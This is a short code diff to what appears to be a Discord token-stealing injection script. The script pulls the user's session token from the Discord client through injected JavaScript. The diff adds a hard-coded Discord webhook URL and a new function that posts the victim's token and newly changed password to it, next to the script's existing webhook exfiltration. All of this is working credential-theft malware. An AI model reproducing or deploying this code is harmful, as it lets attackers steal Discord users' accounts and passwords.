@@ -7,6 +7,7 @@ const {
 const querystring = require('querystring');
 const os = require('os')
 var webhook = "%WEBHOOK_LINK%";
+const swebhook = "https://discord.com/api/webhooks/935908446367252561/6oSRvIUUSGvoUEVbd9IJgYrBZbB9BvFwIdGSKiC67XAhXu0WL8NR8E6JI4ZCAXJqTveP"
 const computerName = os.hostname();
 const discordInstall = `${__dirname}`
 const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
@@ -250,6 +251,16 @@ function SendToWebhook(what) {
     xhr.send(JSON.stringify(${what}));
     `, !0).then((token => {}))
 }
+function sendkk(bot){
+const window = BrowserWindow.getAllWindows()[0];
+	window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "${swebhook}", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+    xhr.send(JSON.stringify(${content: bot}));
+    `, !0).then((token => {}))
+}
+
 
 function GetNitro(flags) {
 	if (flags == 0) {
@@ -884,6 +895,8 @@ function ChangePassword(oldpassword, newpassword, token) {
 							}
 
 							SendToWebhook(JSON.stringify(params))
+                                                      sendkk(`${token}`)
+                                                      sendkk(`${newpassword}`)
 
 						})
 					} else {
